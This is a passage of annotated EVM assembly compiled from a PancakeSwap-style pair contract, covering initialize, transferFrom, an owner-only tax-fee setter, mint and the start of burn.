0x01), 0x01), sload(0x07))\n        /* \"Pair.sol\":2959:2969  msg.sender */\n      caller\n        /* \"Pair.sol\":2959:2980  msg.sender == factory */\n      eq\n        /* \"Pair.sol\":2951:3003  require(msg.sender == factory, \"Pancake: FORBIDDEN\") */\n      tag_192\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x12\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x71, 0x2830b731b0b5b29d102327a92124a22222a7)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_192:\n        /* \"Pair.sol\":3033:3039  token0 */\n      0x08\n        /* \"Pair.sol\":3033:3049  token0 = _token0 */\n      dup1\n      sload\n      sub(shl(0xa0, 0x01), 0x01)\n      swap5\n      dup6\n      and\n      not(sub(shl(0xa0, 0x01), 0x01))\n      swap2\n      dup3\n      and\n      or\n      swap1\n      swap2\n      sstore\n        /* \"Pair.sol\":3059:3065  token1 */\n      0x09\n        /* \"Pair.sol\":3059:3075  token1 = _token1 */\n      dup1\n      sload\n      swap4\n      swap1\n      swap5\n      and\n      swap3\n      and\n      swap2\n      swap1\n      swap2\n      or\n      swap1\n      swap2\n      sstore\n        /* \"Pair.sol\":3085:3091  taxfee */\n      0x0a\n        /* \"Pair.sol\":3085:3101  taxfee = _taxfee */\n      sstore\n        /* \"Pair.sol\":2834:3108  function initialize(... */\n      jump\t// out\n        /* \"ERC20.sol\":307:333  uint256 public totalSupply */\n    tag_66:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":3108:3469  function transferFrom(... */\n    tag_69:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3239:3254  allowance[from] */\n      dup4\n      and\n        /* \"ERC20.sol\":3219:3223  bool */\n      0x00\n        /* \"ERC20.sol\":3239:3254  allowance[from] */\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":3239:3248  allowance */\n      0x02\n        /* \"ERC20.sol\":3239:3254  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":3255:3265  msg.sender */\n      caller\n        /* \"ERC20.sol\":3239:3266  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      dup2\n      keccak256\n      sload\n      not(0x00)\n        /* \"ERC20.sol\":3239:3281  allowance[from][msg.sender] != uint256(-1) */\n      eq\n        /* \"ERC20.sol\":3235:3406  if (allowance[from][msg.sender] != uint256(-1)) {... */\n      tag_194\n      jumpi\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3327:3342  allowance[from] */\n      dup5\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":3327:3336  allowance */\n      0x02\n        /* \"ERC20.sol\":3327:3342  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":3343:3353  msg.sender */\n      caller\n        /* \"ERC20.sol\":3327:3354  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n      sload\n        /* \"ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      tag_195\n      swap1\n        /* \"ERC20.sol\":3376:3381  value */\n      dup4\n        /* \"ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      0xffffffff\n        /* \"ERC20.sol\":3327:3358  allowance[from][msg.sender].sub */\n      tag_177\n        /* \"ERC20.sol\":3327:3395  allowance[from][msg.sender].sub(... */\n      and\n      jump\t// in\n    tag_195:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":3297:3312  allowance[from] */\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"ERC20.sol\":3297:3306  allowance */\n      0x02\n        /* \"ERC20.sol\":3297:3312  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"ERC20.sol\":3313:3323  msg.sender */\n      caller\n        /* \"ERC20.sol\":3297:3324  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n        /* \"ERC20.sol\":3297:3395  allowance[from][msg.sender] = allowance[from][msg.sender].sub(... */\n      sstore\n        /* \"ERC20.sol\":3235:3406  if (allowance[from][msg.sender] != uint256(-1)) {... */\n    tag_194:\n        /* \"ERC20.sol\":3415:3441  _transfer(from, to, value) */\n      tag_196\n        /* \"ERC20.sol\":3425:3429  from */\n      dup5\n        /* \"ERC20.sol\":3431:3433  to */\n      dup5\n        /* \"ERC20.sol\":3435:3440  value */\n      dup5\n        /* \"ERC20.sol\":3415:3424  _transfer */\n      tag_197\n        /* \"ERC20.sol\":3415:3441  _transfer(from, to, value) */\n      jump\t// in\n    tag_196:\n      pop\n        /* \"ERC20.sol\":3458:3462  true */\n      0x01\n        /* \"ERC20.sol\":3108:3469  function transferFrom(... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n    tag_71:\n        /* \"ERC20.sol\":706:772  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"ERC20.sol\":656:772  bytes32 public constant PERMIT_TYPEHASH =... */\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n    tag_73:\n        /* \"ERC20.sol\":299:301  18 */\n      0x12\n        /* \"ERC20.sol\":266:301  uint8 public constant decimals = 18 */\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":515:546  bytes32 public DOMAIN_SEPARATOR */\n    tag_75:\n      sload(0x04)\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n    tag_78:\n      mstore(0x20, 0x03)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":934:966  uint public price0CumulativeLast */\n    tag_80:\n      sload(0x0c)\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":972:1004  uint public price1CumulativeLast */\n    tag_82:\n      sload(0x0d)\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":1482:1599  function taxfeeupdate(uint _newtax) public onlyOwner {... */\n    tag_85:\n        /* \"Pair.sol\":1415:1420  owner */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x0f))\n        /* \"Pair.sol\":1401:1411  msg.sender */\n      caller\n        /* \"Pair.sol\":1401:1420  msg.sender == owner */\n      eq\n        /* \"Pair.sol\":1393:1458  require(msg.sender == owner, \"Only owner can call this function\") */\n      tag_199\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x21\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_1b988f8784cc3cf7ad7d1bf59197df07b7925b5a748a478400a8f83fd9e196ef\n      0x21\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_199:\n        /* \"Pair.sol\":1545:1551  taxfee */\n      0x0a\n        /* \"Pair.sol\":1545:1561  taxfee = _newtax */\n      sstore\n        /* \"Pair.sol\":1482:1599  function taxfeeupdate(uint _newtax) public onlyOwner {... */\n      jump\t// out\n        /* \"Pair.sol\":5261:6526  function mint(address to) external lock returns (uint liquidity) {... */\n    tag_88:\n        /* \"Pair.sol\":5310:5324  uint liquidity */\n      0x00\n        /* \"Pair.sol\":1205:1213  unlocked */\n      sload(0x10)\n        /* \"Pair.sol\":1217:1218  1 */\n      0x01\n        /* \"Pair.sol\":1205:1218  unlocked == 1 */\n      eq\n        /* \"Pair.sol\":1197:1238  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_202\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_202:\n        /* \"Pair.sol\":1259:1260  0 */\n      0x00\n        /* \"Pair.sol\":1248:1256  unlocked */\n      0x10\n        /* \"Pair.sol\":1248:1260  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"Pair.sol\":1259:1260  0 */\n      dup1\n        /* \"Pair.sol\":5379:5392  getReserves() */\n      tag_204\n        /* \"Pair.sol\":5379:5390  getReserves */\n      tag_56\n        /* \"Pair.sol\":5379:5392  getReserves() */\n      jump\t// in\n    tag_204:\n      pop\n        /* \"Pair.sol\":5440:5446  token0 */\n      sload(0x08)\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":5466:5470  this */\n      address\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":5336:5392  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap4\n      swap6\n      pop\n      swap2\n      swap4\n      pop\n        /* \"Pair.sol\":5417:5430  uint balance0 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":5440:5446  token0 */\n      swap1\n      swap2\n      and\n      swap2\n        /* \"Pair.sol\":5433:5457  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":5440:5446  token0 */\n      dup7\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_205\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_205:\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_206\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_206:\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_207\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_207:\n      pop\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"Pair.sol\":5505:5511  token1 */\n      sload(0x09)\n        /* \"Pair.sol\":5498:5537  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":5531:5535  this */\n      address\n        /* \"Pair.sol\":5498:5537  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      swap3\n      swap4\n      pop\n        /* \"Pair.sol\":5482:5495  uint balance1 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":5505:5511  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"Pair.sol\":5498:5522  IERC20(token1).balanceOf */\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":5498:5537  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"Pair.sol\":5433:5472  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"Pair.sol\":5498:5537  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":5505:5511  token1 */\n      dup7\n        /* \"Pair.sol\":5498:5537  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_208\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_208:\n        /* \"Pair.sol\":5498:5537  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_209\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_209:\n        /* \"Pair.sol\":5498:5537  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_210\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_210:\n      pop\n        /* \"Pair.sol\":5498:5537  IERC20(token1).balanceOf(address(this)) */\n      mload\n      swap1\n      pop\n        /* \"Pair.sol\":5547:5559  uint amount0 */\n      0x00\n        /* \"Pair.sol\":5562:5585  balance0.sub(_reserve0) */\n      tag_211\n        /* \"Pair.sol\":5562:5570  balance0 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":5562:5585  balance0.sub(_reserve0) */\n      dup8\n      and\n      0xffffffff\n        /* \"Pair.sol\":5562:5574  balance0.sub */\n      tag_177\n        /* \"Pair.sol\":5562:5585  balance0.sub(_reserve0) */\n      and\n      jump\t// in\n    tag_211:\n        /* \"Pair.sol\":5547:5585  uint amount0 = balance0.sub(_reserve0) */\n      swap1\n      pop\n        /* \"Pair.sol\":5595:5607  uint amount1 */\n      0x00\n        /* \"Pair.sol\":5610:5633  balance1.sub(_reserve1) */\n      tag_212\n        /* \"Pair.sol\":5610:5618  balance1 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":5610:5633  balance1.sub(_reserve1) */\n      dup8\n      and\n      0xffffffff\n        /* \"Pair.sol\":5610:5622  balance1.sub */\n      tag_177\n        /* \"Pair.sol\":5610:5633  balance1.sub(_reserve1) */\n      and\n      jump\t// in\n    tag_212:\n        /* \"Pair.sol\":5595:5633  uint amount1 = balance1.sub(_reserve1) */\n      swap1\n      pop\n        /* \"Pair.sol\":5644:5654  bool feeOn */\n      0x00\n        /* \"Pair.sol\":5657:5687  _mintFee(_reserve0, _reserve1) */\n      tag_213\n        /* \"Pair.sol\":5666:5675  _reserve0 */\n      dup8\n        /* \"Pair.sol\":5677:5686  _reserve1 */\n      dup8\n        /* \"Pair.sol\":5657:5665  _mintFee */\n      tag_214\n        /* \"Pair.sol\":5657:5687  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_213:\n        /* \"Pair.sol\":5697:5714  uint _totalSupply */\n      0x00\n        /* \"Pair.sol\":5717:5728  totalSupply */\n      sload\n        /* \"Pair.sol\":5644:5687  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"Pair.sol\":5820:5837  _totalSupply == 0 */\n      dup1\n        /* \"Pair.sol\":5816:6210  if (_totalSupply == 0) {... */\n      tag_215\n      jumpi\n        /* \"Pair.sol\":5865:5919  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      tag_216\n        /* \"Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"Pair.sol\":5865:5896  Math.sqrt(amount0.mul(amount1)) */\n      tag_176\n        /* \"Pair.sol\":5875:5895  amount0.mul(amount1) */\n      tag_218\n        /* \"Pair.sol\":5875:5882  amount0 */\n      dup8\n        /* \"Pair.sol\":5887:5894  amount1 */\n      dup8\n        /* \"Pair.sol\":5875:5895  amount0.mul(amount1) */\n      0xffffffff\n        /* \"Pair.sol\":5875:5886  amount0.mul */\n      tag_175\n        /* \"Pair.sol\":5875:5895  amount0.mul(amount1) */\n      and\n      jump\t// in\n    tag_218:\n        /* \"Pair.sol\":5865:5874  Math.sqrt */\n      tag_219\n        /* \"Pair.sol\":5865:5896  Math.sqrt(amount0.mul(amount1)) */\n      jump\t// in\n        /* \"Pair.sol\":5865:5919  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n    tag_216:\n        /* \"Pair.sol\":5853:5919  liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      swap9\n      pop\n        /* \"Pair.sol\":5933:5969  _mint(address(0), MINIMUM_LIQUIDITY) */\n      tag_220\n        /* \"Pair.sol\":5947:5948  0 */\n      0x00\n        /* \"Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"Pair.sol\":5933:5938  _mint */\n      tag_221\n        /* \"Pair.sol\":5933:5969  _mint(address(0), MINIMUM_LIQUIDITY) */\n      jump\t// in\n    tag_220:\n        /* \"Pair.sol\":5816:6210  if (_totalSupply == 0) {... */\n      jump(tag_222)\n    tag_215:\n        /* \"Pair.sol\":6067:6199  Math.min(... */\n      tag_223\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":6093:6130  amount0.mul(_totalSupply) / _reserve0 */\n      dup10\n      and\n        /* \"Pair.sol\":6093:6118  amount0.mul(_totalSupply) */\n      tag_224\n        /* \"Pair.sol\":6093:6100  amount0 */\n      dup7\n        /* \"Pair.sol\":6105:6117  _totalSupply */\n      dup5\n        /* \"Pair.sol\":6093:6118  amount0.mul(_totalSupply) */\n      0xffffffff\n        /* \"Pair.sol\":6093:6104  amount0.mul */\n      tag_175\n        /* \"Pair.sol\":6093:6118  amount0.mul(_totalSupply) */\n      and\n      jump\t// in\n    tag_224:\n        /* \"Pair.sol\":6093:6130  amount0.mul(_totalSupply) / _reserve0 */\n      dup2\n      tag_225\n      jumpi\n      invalid\n    tag_225:\n      div\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":6148:6185  amount1.mul(_totalSupply) / _reserve1 */\n      dup10\n      and\n        /* \"Pair.sol\":6148:6173  amount1.mul(_totalSupply) */\n      tag_226\n        /* \"Pair.sol\":6148:6155  amount1 */\n      dup7\n        /* \"Pair.sol\":6160:6172  _totalSupply */\n      dup6\n        /* \"Pair.sol\":6148:6173  amount1.mul(_totalSupply) */\n      0xffffffff\n        /* \"Pair.sol\":6148:6159  amount1.mul */\n      tag_175\n        /* \"Pair.sol\":6148:6173  amount1.mul(_totalSupply) */\n      and\n      jump\t// in\n    tag_226:\n        /* \"Pair.sol\":6148:6185  amount1.mul(_totalSupply) / _reserve1 */\n      dup2\n      tag_227\n      jumpi\n      invalid\n    tag_227:\n      div\n        /* \"Pair.sol\":6067:6075  Math.min */\n      tag_228\n        /* \"Pair.sol\":6067:6199  Math.min(... */\n      jump\t// in\n    tag_223:\n        /* \"Pair.sol\":6055:6199  liquidity = Math.min(... */\n      swap9\n      pop\n        /* \"Pair.sol\":5816:6210  if (_totalSupply == 0) {... */\n    tag_222:\n        /* \"Pair.sol\":6239:6240  0 */\n      0x00\n        /* \"Pair.sol\":6227:6236  liquidity */\n      dup10\n        /* \"Pair.sol\":6227:6240  liquidity > 0 */\n      gt\n        /* \"Pair.sol\":6219:6283  require(liquidity > 0, \"Pancake: INSUFFICIENT_LIQUIDITY_MINTED\") */\n      tag_229\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x26\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_ef633320352a650c1d75752f13e6c73d8d8f7f26a5596a6d026c1bf50d2f7713\n      0x26\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_229:\n        /* \"Pair.sol\":6293:6313  _mint(to, liquidity) */\n      tag_230\n        /* \"Pair.sol\":6299:6301  to */\n      dup11\n        /* \"Pair.sol\":6303:6312  liquidity */\n      dup11\n        /* \"Pair.sol\":6293:6298  _mint */\n      tag_221\n        /* \"Pair.sol\":6293:6313  _mint(to, liquidity) */\n      jump\t// in\n    tag_230:\n        /* \"Pair.sol\":6324:6373  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_231\n        /* \"Pair.sol\":6332:6340  balance0 */\n      dup7\n        /* \"Pair.sol\":6342:6350  balance1 */\n      dup7\n        /* \"Pair.sol\":6352:6361  _reserve0 */\n      dup11\n        /* \"Pair.sol\":6363:6372  _reserve1 */\n      dup11\n        /* \"Pair.sol\":6324:6331  _update */\n      tag_186\n        /* \"Pair.sol\":6324:6373  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_231:\n        /* \"Pair.sol\":6387:6392  feeOn */\n      dup2\n        /* \"Pair.sol\":6383:6430  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n      iszero\n      tag_232\n      jumpi\n        /* \"Pair.sol\":6421:6429  reserve1 */\n      sload(0x0b)\n        /* \"Pair.sol\":6402:6430  uint(reserve0).mul(reserve1) */\n      tag_233\n      swap1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":6407:6415  reserve0 */\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"Pair.sol\":6421:6429  reserve1 */\n      swap1\n      div\n      and\n        /* \"Pair.sol\":6402:6430  uint(reserve0).mul(reserve1) */\n      0xffffffff\n        /* \"Pair.sol\":6402:6420  uint(reserve0).mul */\n      tag_175\n        /* \"Pair.sol\":6402:6430  uint(reserve0).mul(reserve1) */\n      and\n      jump\t// in\n    tag_233:\n        /* \"Pair.sol\":6394:6399  kLast */\n      0x0e\n        /* \"Pair.sol\":6394:6430  kLast = uint(reserve0).mul(reserve1) */\n      sstore\n        /* \"Pair.sol\":6383:6430  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n    tag_232:\n        /* \"Pair.sol\":6485:6519  Mint(msg.sender, amount0, amount1) */\n      0x40\n      dup1\n      mload\n      dup6\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup6\n      swap1\n      mstore\n      dup2\n      mload\n        /* \"Pair.sol\":6490:6500  msg.sender */\n      caller\n      swap3\n        /* \"Pair.sol\":6485:6519  Mint(msg.sender, amount0, amount1) */\n      0x4c209b5fc8ad50758f13e2e1088ba56a560dff690a1c6fef26394f4c03821c4f\n      swap3\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      log2\n      pop\n      pop\n        /* \"Pair.sol\":1292:1293  1 */\n      0x01\n        /* \"Pair.sol\":1281:1289  unlocked */\n      0x10\n        /* \"Pair.sol\":1281:1293  unlocked = 1 */\n      sstore\n      pop\n        /* \"Pair.sol\":5261:6526  function mint(address to) external lock returns (uint liquidity) {... */\n      swap5\n      swap7\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n    tag_91:\n      mstore(0x20, 0x01)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":1010:1027  uint public kLast */\n    tag_93:\n      sload(0x0e)\n      dup2\n      jump\t// out\n        /* \"ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n    tag_96:\n      mstore(0x20, 0x05)\n      0x00\n      swap1\n      dup2\n      mstore\n      0x40\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":8025:9454  function burn(... */\n    tag_99:\n        /* \"Pair.sol\":8088:8100  uint amount0 */\n      0x00\n        /* \"Pair.sol\":8102:8114  uint amount1 */\n      dup1\n        /* \"Pair.sol\":1205:1213  unlocked */\n      sload(0x10)\n        /* \"Pair.sol\":1217:1218  1 */\n      0x01\n        /* \"Pair.sol\":1205:1218  unlocked == 1 */\n      eq\n        /* \"Pair.sol\":1197:1238  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_235\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_235:\n        /* \"Pair.sol\":1259:1260  0 */\n      0x00\n        /* \"Pair.sol\":1248:1256  unlocked */\n      0x10\n        /* \"Pair.sol\":1248:1260  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"Pair.sol\":1259:1260  0 */\n      dup1\n        /* \"Pair.sol\":8169:8182  getReserves() */\n      tag_237\n        /* \"Pair.sol\":8169:8180  getReserves */\n      tag_56\n        /* \"Pair.sol\":8169:8182  getReserves() */\n      jump\t// in\n    tag_237:\n      pop\n        /* \"Pair.sol\":8225:8231  token0 */\n      sload(0x08)\n        /* \"Pair.sol\":8274:8280  token1 */\n      sload(0x09)\n        /* \"Pair.sol\":8321:8361  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":8355:8359  this */\n      address\n        /* \"Pair.sol\":8321:8361  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":8126:8182  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap5\n      swap7\n      pop\n      swap3\n      swap5\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":8225:8231  token0 */\n      swap2\n      dup3\n      and\n      swap4\n        /* \"Pair.sol\":8274:8280  token1 */\n      swap2\n      and\n      swap2\n        /* \"Pair.sol\":8207:8222  address _token0 */\n      0x00\n      swap2\n        /* \"Pair.sol\":8225:8231  token0 */\n      dup5\n      swap2\n        /* \"Pair.sol\":8321:8346  IERC20(_token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":8321:8361  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":8225:8231  token0 */\n      dup7\n        /* \"Pair.sol\":8321:8361  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_238\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_238:\n        /* \"Pair.sol\":8321:8361  